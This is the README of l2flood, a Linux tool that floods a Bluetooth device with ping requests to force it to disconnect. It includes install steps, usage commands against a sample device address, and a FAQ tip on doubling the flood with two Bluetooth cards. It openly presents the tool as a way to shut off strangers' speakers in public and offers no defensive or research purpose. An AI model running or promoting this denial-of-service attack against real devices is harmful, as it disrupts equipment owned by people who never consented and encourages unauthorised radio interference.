# l2flood

[![builds.sr.ht status](https://builds.sr.ht/~kovmir/l2flood/commits/master/.build.yml.svg)](https://builds.sr.ht/~kovmir/l2flood/commits/master/.build.yml?)

Flood a given bluetooth device with ping requests in order to force it to
disconnect.

# INSTALL

Satisfy the [dependencies](#dependencies) first, and then:

```bash
git clone https://git.sr.ht/~kovmir/l2flood
cd l2flood
make
sudo make install
```

# USAGE

Suppose there is a loud bluetooth speaker in public, and suppose
`94:3a:2c:e1:2b:07` is its address. You can shut it off like that:

```bash
l2flood 94:3a:2c:e1:2b:07 # Flood with up to 4 threads, depending on how many CPU cores are available.
l2flood -t 5 94:3a:2c:e1:2b:07 # Flood with 5 threads.
```

A weak speaker CPU or Bluetooth interface will not be able to process that many
ping requests, and receive/decode music simultaneously, so it will
disconnect.

*Your bluetooth card is your bottleneck: Even if you have a multi-core
multi-gigahertz CPU, it makes little to no sense to spawn as much as 100
threads, because your bluetooth card is unlikely to be fast enough to process
all the requests as quick as you submit them.*

# DEPENDENCIES

* [Bluez][3]
  * On Debian/Ubuntu/Kali `sudo apt install -y libbluetooth-dev`.

# SUPPORTED OPERATING SYSTEMS

* Linux

# CREDITS

[@Ymsniper](https://github.com/Ymsniper) refactored the entire flood algorithm.

# FAQ

**Q: Does it work in [termux][2]?**

A: No, [Bluez][3] libraries are not available in termux.

**Q: Does it work on Steam Deck?**

A: Yes.

**Q: How to increase flood efficiency?**

A: Get a second bluetooth card, and flood using both of them.

```bash
BT_ADDR='00:00:00:00:00:00' # Set the target address.
l2flood -i hci0 $BT_ADDR &
l2flood -i hci1 $BT_ADDR
```

**Q: How to fix `Can't create socket: Operation not permitted`?**

A: Re-run as `root` user.

[2]: https://github.com/termux/termux-app
[3]: https://www.bluez.org/
